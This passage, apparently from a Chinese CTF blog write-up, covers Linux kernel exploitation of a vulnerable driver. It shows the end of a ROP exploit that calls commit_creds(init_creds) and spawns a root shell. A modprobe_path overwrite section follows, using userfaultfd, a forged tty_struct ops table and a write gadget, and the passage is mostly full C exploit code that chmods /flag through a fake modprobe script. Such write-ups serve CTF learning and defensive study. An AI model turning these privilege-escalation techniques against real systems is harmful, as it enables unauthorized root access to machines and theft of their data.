r14,   init_creds;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13,   commit_creds;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12,   swapgs_restore_regs_and_return_to_usermode;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbp,   0;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbx,   0;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r11,   user_cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10,   user_rflags;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r9,    user_sp;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r8,    user_ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;xor rax,   16;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx,   0xfffffe0000010f58;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi,   0xfffffe0000010f58;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi,   tty_fd;&quot;</span>        </span><br><span class="line">        <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    hexx(<span class="string">&quot;UID&quot;</span>, getuid());</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] EXP END.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="notes-leak-userfaultfd-tty-struct-modprobe-path"><a href="#notes-leak-userfaultfd-tty-struct-modprobe-path" class="headerlink" title="notes leak + userfaultfd + tty_struct + modprobe_path"></a>notes leak + userfaultfd + tty_struct + modprobe_path</h2><h3 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h3><p>好，我这个人比较懒，不想进行两次栈迁移，而且现在假设这道题目的 pt_regs 开启了随机化(CONFIG_RANDOMIZE_KSTACK_OFFSET&#x3D;y)，每次在栈上的偏移都不一样，这个时候就有请我们的 <code>modprobe_path</code> 登场了。只要我们能够修改这个地方的值，我们就能够变向的将 <code>flag</code> 的权限提升到普通都可以读取，那我们要如何修改这个地方的值呢？我们找到了一个很好用的 <code>gadget</code> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xffffffff810f69f1</span>: mov qword ptr [rdx + <span class="number">8</span>], rsi; ret;</span><br></pre></td></tr></table></figure><p>当我们执行 <code>iotcl(tty_fd, var1, var2)</code> 的时候，<code>rdx</code> 和 <code>rsi</code> 是可控的，也就是说我们可以通过《类似于》 <code>ioctl(tty_fd, &quot;/tmp/sh&quot;, modprobe_path - 8);</code> 来实现对 <code>modprobe_path</code> 的修改</p><img src="/2024/10/07/kno_puts/4.png" class="" title="我的图图呢">  <p>由于 <code>ioctl</code> 的 <code>rsi</code> 传进去的最终只有四字节，所以我们要分段传两次</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// musl-gcc exp.c --static -masm=intel -lpthread -idirafter /usr/include/ -idirafter /usr/include/x86_64-linux-gnu/ -o exp</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/utsname.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/if_packet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> modprobe_path = <span class="number">0xffffffff824493c0</span>;</span><br><span class="line"><span class="type">size_t</span> heap_addr = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> work_for_cpu_fn = <span class="number">0xffffffff810bd960</span>;</span><br><span class="line"><span class="type">size_t</span> init_creds = <span class="number">0xffffffff82c6b920</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xffffffff810ce710</span>;</span><br><span class="line"><span class="type">size_t</span> fake_ops_addr = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> orignal[<span class="number">0x30</span>];</span><br><span class="line"><span class="type">size_t</span> leak, kernel_base;</span><br><span class="line"><span class="type">size_t</span> gadget = <span class="number">0xffffffff817d1e76</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rdi;</span><br><span class="line"><span class="type">size_t</span> add_rsp_188_pop_rbx_ret;</span><br><span class="line"><span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff81c00a74</span>;</span><br><span class="line"><span class="type">size_t</span> magic_gadget = <span class="number">0xffffffff810f69f1</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> *msg;</span><br><span class="line">    <span class="type">uint64_t</span> a;</span><br><span class="line">    <span class="type">uint64_t</span> b;</span><br><span class="line">    <span class="type">uint64_t</span> c;</span><br><span class="line">    <span class="type">uint64_t</span> d;</span><br><span class="line">    <span class="type">uint64_t</span> e;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> <span class="title">vuln</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">info</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[+] %s\n\033[0m&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexx</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s: %#lx\n\033[0m&quot;</span>, msg, value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">binary_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33m[*] %s:\n\033[0m&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* bind the process to specific core */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span>&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pushf;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pop user_rflags;&quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">char</span> v14[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Begin add.&quot;</span>);</span><br><span class="line">    vuln.e = (<span class="type">size_t</span>)v14;</span><br><span class="line">    <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">        <span class="type">int</span> result = ioctl(fd, <span class="number">0xFFF0</span>, &amp;vuln);</span><br><span class="line">        <span class="keyword">if</span>(result != <span class="number">-1</span>)&#123;</span><br><span class="line">            info(<span class="string">&quot;Add success.&quot;</span>);</span><br><span class="line">            heap_addr = *(<span class="type">size_t</span>*)vuln.e;</span><br><span class="line">            hexx(<span class="string">&quot;heap_addr&quot;</span>, heap_addr);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">del</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Begin delete&quot;</span>);</span><br><span class="line">    vuln.e = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">        <span class="type">int</span> result = ioctl(fd, <span class="number">0xFFF1</span>, &amp;vuln);</span><br><span class="line">        <span class="keyword">if</span>(result != <span class="number">-1</span>)&#123;</span><br><span class="line">            info(<span class="string">&quot;Delete success.&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">sem_t</span> sem_write, sem_free;</span><br><span class="line"><span class="type">size_t</span> payload[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">int</span> tty_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> uffd_buf[<span class="number">0x200</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">register_userfaultfd</span><span class="params">(<span class="type">void</span>* uffd_buf, <span class="type">pthread_t</span> pthread_moniter, <span class="type">void</span>* handler)</span>&#123;</span><br><span class="line">    <span class="type">int</span> uffd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line"> </span><br><span class="line">    uffd = syscall(__NR_userfaultfd, O_NONBLOCK|O_CLOEXEC);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>) err_exit(<span class="string">&quot;syscall for userfaultfd ERROR in register_userfaultfd func&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    uffdio_api.api = UFFD_API;</span><br><span class="line">    uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>) err_exit(<span class="string">&quot;ioctl for UFFDIO_API ERROR&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    uffdio_register.range.start = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)uffd_buf;</span><br><span class="line">    uffdio_register.range.len = <span class="number">0x1000</span>;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>) err_exit(<span class="string">&quot;ioctl for UFFDIO_REGISTER ERROR&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="type">int</span> res = pthread_create(&amp;pthread_moniter, <span class="literal">NULL</span>, handler, uffd);</span><br><span class="line">    <span class="keyword">if</span> (res == <span class="number">-1</span>) err_exit(<span class="string">&quot;pthread_create ERROR in register_userfaultfd func&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hijack_handler</span><span class="params">(<span class="type">void</span> *args)</span>&#123;</span><br><span class="line">    <span class="type">int</span> uffd = (<span class="type">int</span>)args;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;)&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        <span class="keyword">if</span> (poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;Failed to exec poll for leak_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> res = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">        <span class="keyword">if</span> (res == <span class="number">0</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;EOF on userfaultfd for leak_handler&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (res == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;ERROR on userfaultfd for leak_handler&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            err_exit(<span class="string">&quot;INCORRET EVENT in leak_handler&quot;</span>);</span><br><span class="line">        <span class="comment">// operation</span></span><br><span class="line">        info(<span class="string">&quot;hijack the kernel in userfaultfd -- hijack_handler&quot;</span>);</span><br><span class="line">        del();</span><br><span class="line"></span><br><span class="line">        tty_fd = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR);</span><br><span class="line">        uffd_buf[<span class="number">0</span>] = <span class="number">0x100005401</span>;</span><br><span class="line">        uffd_buf[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">        uffd_buf[<span class="number">2</span>] = kernel_base + <span class="number">0x13e8030</span> - <span class="number">0x60</span>;</span><br><span class="line">        uffd_buf[<span class="number">3</span>] = fake_ops_addr + <span class="number">0x40</span>;</span><br><span class="line">        uffd_buf[<span class="number">4</span>] = commit_creds;</span><br><span class="line">        uffd_buf[<span class="number">5</span>] = init_creds;</span><br><span class="line">        uffd_buf[<span class="number">7</span>] = magic_gadget;</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[0]&quot;</span>, uffd_buf[<span class="number">0</span>]);</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[1]&quot;</span>, uffd_buf[<span class="number">1</span>]);</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[2]&quot;</span>, uffd_buf[<span class="number">2</span>]);</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[3]&quot;</span>, uffd_buf[<span class="number">3</span>]);</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[4]&quot;</span>, uffd_buf[<span class="number">4</span>]);</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[5]&quot;</span>, uffd_buf[<span class="number">5</span>]);</span><br><span class="line">        </span><br><span class="line">        uffdio_copy.src = uffd_buf;</span><br><span class="line">        uffdio_copy.dst = (<span class="type">unsigned</span> <span class="type">long</span>)msg.arg.pagefault.address &amp; ~(<span class="number">0x1000</span> - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = <span class="number">0x1000</span>;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;Failed to exec ioctl for UFFDIO_COPY in leak_handler&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_flag</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">0x50</span>];</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;# make fake file magic not found&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo &#x27;#!/bin/sh\nchmod 777 /flag&#x27;&gt;/tmp/sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;echo -e &#x27;\\xff\\xff\\xff\\xff&#x27;&gt;/tmp/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/tmp/fake&quot;</span>);</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;get flag&quot;</span>);</span><br><span class="line">    <span class="type">int</span> flag_fd = open(<span class="string">&quot;/flag&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (flag_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open flag failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    read(flag_fd, data, <span class="number">0x50</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] flag is: %s\n&quot;</span>, data);</span><br><span 